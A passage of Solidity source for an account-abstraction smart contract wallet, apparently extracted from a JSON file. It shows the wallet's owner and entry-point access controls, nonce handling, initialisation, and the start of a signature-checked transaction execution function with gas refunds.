indexed entryPoint, address indexed owner);\n\n    // modifiers\n    // onlyOwner\n    /**\n     * @notice Throws if the sender is not an the owner.\n     */\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n        _;\n    }\n\n    // onlyOwner OR self\n    modifier mixedAuth {\n        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n        _;\n   }\n\n   // only from EntryPoint\n   modifier onlyEntryPoint {\n        require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n        _; \n   }\n\n   function nonce() public view virtual override returns (uint256) {\n        return nonces[0];\n    }\n\n    function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n        return nonces[_batchId];\n    }\n\n    function entryPoint() public view virtual override returns (IEntryPoint) {\n        return _entryPoint;\n    }\n\n    // @notice authorized modifier (onlySelf) is already inherited\n\n    // Setters\n\n    function setOwner(address _newOwner) external mixedAuth {\n        require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n        address oldOwner = owner;\n        owner = _newOwner;\n        emit EOAChanged(address(this), oldOwner, _newOwner);\n    }\n\n    /**\n     * @notice Updates the implementation of the base wallet\n     * @param _implementation New wallet implementation\n     */\n    function updateImplementation(address _implementation) external mixedAuth {\n        require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n        _setImplementation(_implementation);\n        // EOA + Version tracking\n        emit ImplementationUpdated(address(this), VERSION, _implementation);\n    }\n\n    function updateEntryPoint(address _newEntryPoint) external mixedAuth {\n        require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n        emit EntryPointChanged(address(_entryPoint), _newEntryPoint);\n        _entryPoint = IEntryPoint(payable(_newEntryPoint));\n    }\n\n    // Getters\n\n    function domainSeparator() public view returns (bytes32) {\n        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n    }\n\n    /// @dev Returns the chain id used by this contract.\n    function getChainId() public view returns (uint256) {\n        uint256 id;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            id := chainid()\n        }\n        return id;\n    }\n\n    //@review getNonce specific to EntryPoint requirements\n    /**\n     * @dev returns a value from the nonces 2d mapping\n     * @param batchId : the key of the user's batch being queried\n     * @return nonce : the number of transaction made within said batch\n     */\n    function getNonce(uint256 batchId)\n    public view\n    returns (uint256) {\n        return nonces[batchId];\n    }\n\n\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n    // Gnosis style transaction with optional repay in native tokens OR ERC20 \n    /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.\n    /// Note: The fees are always transferred, even if the user transaction fails.\n    /// @param _tx Wallet transaction \n    /// @param batchId batchId key for 2D nonces\n    /// @param refundInfo Required information for gas refunds\n    /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) public payable virtual override returns (bool success) {\n        // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n        //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n        uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n        //console.log(\"init %s\", 21000 + msg.data.length * 8);\n        bytes32 txHash;\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            bytes memory txHashData =\n                encodeTransactionData(\n                    // Transaction info\n                    _tx,\n                    // Payment info\n                    refundInfo,\n                    // Signature info\n                    nonces[batchId]\n                );\n            // Increase nonce and execute transaction.\n            // Default space aka batchId is 0\n            nonces[batchId]++;\n            txHash = keccak256(txHashData);\n            checkSignatures(txHash, txHashData, signatures);\n        }\n\n\n        // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)\n        // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150\n        require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than targetTxGas)\n            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n            // If no targetTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful\n            // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert\n            require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n            uint256 payment = 0;\n            // uint256 extraGas;"
    }
  ]
}